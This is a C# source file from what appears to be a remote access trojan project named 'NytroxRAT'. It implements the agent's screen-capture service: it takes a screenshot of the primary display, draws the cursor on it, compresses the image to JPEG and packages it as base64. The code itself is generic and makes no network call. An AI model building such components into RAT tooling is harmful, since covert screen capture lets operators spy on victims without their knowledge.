using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using NytroxRAT.Shared.Models;

namespace NytroxRAT.Agent.Services;

/// <summary>Captures the primary screen as a JPEG and returns a ScreenFramePayload.</summary>
public class ScreenCaptureService
{
    private int _quality = 50; // JPEG quality 1-100

    public void SetQuality(int quality) => _quality = Math.Clamp(quality, 10, 100);

    public ScreenFramePayload Capture()
    {
        var bounds = GetScreenBounds();
        using var bmp = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
        using var g   = Graphics.FromImage(bmp);
        g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);

        // Draw cursor
        DrawCursor(g, bounds);

        using var ms          = new MemoryStream();
        var       encoderParams = new EncoderParameters(1);
        encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, (long)_quality);
        var jpegCodec = GetJpegCodec();
        bmp.Save(ms, jpegCodec, encoderParams);

        return new ScreenFramePayload
        {
            Width       = bounds.Width,
            Height      = bounds.Height,
            ImageBase64 = Convert.ToBase64String(ms.ToArray()),
            Quality     = _quality
        };
    }

    private static Rectangle GetScreenBounds()
    {
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);
        return new Rectangle(0, 0, w, h);
    }

    private static void DrawCursor(Graphics g, Rectangle bounds)
    {
        try
        {
            CURSORINFO ci = new() { cbSize = Marshal.SizeOf<CURSORINFO>() };
            if (!GetCursorInfo(ref ci) || ci.flags != CURSOR_SHOWING) return;
            var cursor = new Cursor(ci.hCursor);
            var pos    = new Point(ci.ptScreenPos.x - bounds.X, ci.ptScreenPos.y - bounds.Y);
            cursor.Draw(g, new Rectangle(pos, cursor.Size));
        }
        catch { /* non-fatal */ }
    }

    private static ImageCodecInfo GetJpegCodec()
    {
        var codec = ImageCodecInfo.GetImageEncoders().FirstOrDefault(c => c.MimeType == "image/jpeg");
        if (codec == null) throw new InvalidOperationException("JPEG encoder not available on this system.");
        return codec;
    }

    // ── Win32 ──────────────────────────────────────────────────────────────
    private const int SM_CXSCREEN  = 0;
    private const int SM_CYSCREEN  = 1;
    private const int CURSOR_SHOWING = 1;

    [DllImport("user32.dll")] private static extern int GetSystemMetrics(int nIndex);
    [DllImport("user32.dll")] private static extern bool GetCursorInfo(ref CURSORINFO pci);

    [StructLayout(LayoutKind.Sequential)]
    private struct POINT { public int x; public int y; }

    [StructLayout(LayoutKind.Sequential)]
    private struct CURSORINFO
    {
        public int    cbSize;
        public int    flags;
        public IntPtr hCursor;
        public POINT  ptScreenPos;
    }
}
